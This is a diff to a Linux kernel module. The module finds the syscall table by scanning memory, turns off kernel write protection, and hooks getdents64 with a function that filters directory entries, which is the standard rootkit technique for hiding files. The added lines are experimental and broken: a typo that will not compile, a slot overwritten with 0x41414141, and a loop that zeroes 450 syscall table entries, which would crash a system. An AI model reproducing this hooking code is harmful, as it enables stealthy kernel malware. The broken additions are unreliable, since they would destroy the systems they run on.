@@ -13,8 +13,8 @@
 #include <asm/uaccess.h>
 #include <hooking.h>
 #include <../arch/x86/include/asm/paravirt.h>
-unsigned long ** sys_call_table;
-unsigned long ** find_systable(void);
+unsigned long * sys_call_table;
+unsigned long * find_systable(void);
 int hook_dents(void);
 asmlinkage long (*old_dents)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
 asmlinkage long new_dents(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
@@ -62,14 +62,14 @@ asmlinkage long new_dents(unsigned int fd, struct linux_dirent64 __user *dirent,
 	kfree(ret_dir);
 	return new_len;
 }
-unsigned long ** find_systable(void){
+unsigned long * find_systable(void){
 	unsigned long offset = PAGE_OFFSET;
-	unsigned long ** systable;
+	unsigned long * systable;
 	unsigned long i;
 
 	for (i = offset; i < ULLONG_MAX; i+=sizeof(void*)){
-		systable = (unsigned long **)i;
-		if (systable[__NR_close] == (unsigned long *)kallsyms_lookup_name("sys_close")){
+		systable = (unsigned long *)i;
+		if (systable[__NR_getdents64] == kallsyms_lookup_name("sys_getdents64")){
 			return systable;
 		}
 	}
@@ -81,9 +81,16 @@ int hook_dents(void){
 	}
 	printk(KERN_INFO "old boi %p", (void *) sys_call_table[__NR_getdents64]);
 	old_dents = (void *)sys_call_table[__NR_getdents64];
-	write_cr0(read_cr0() & ~0x10000);
-	sys_call_table[__NR_getdents64] = (unsigned long *)new_dents;
+printk(KERN_INFO "what is this boi %d", __NR_getdents64);
+		write_cr0(read_cr0() & ~ix10000);
+	//so this somehow doesn't break everythign :thinking
+	sys_call_table[217] =0x41414141;//(void*) new_dents;
+	int i;
+	for (i =0; i < 450; i++){
+		sys_call_table[i] = 0x0;
+		printk(KERN_INFO "testing table %ld", sys_call_table[i]);
+	}
 	write_cr0(read_cr0() | 0x10000);
-	printk(KERN_INFO "new boi %p", (void *) sys_call_table[__NR_getdents64]);
+	printk(KERN_INFO "looking at i=for 41 bois %p", (void *) sys_call_table[217]);
 	return 0;
 }
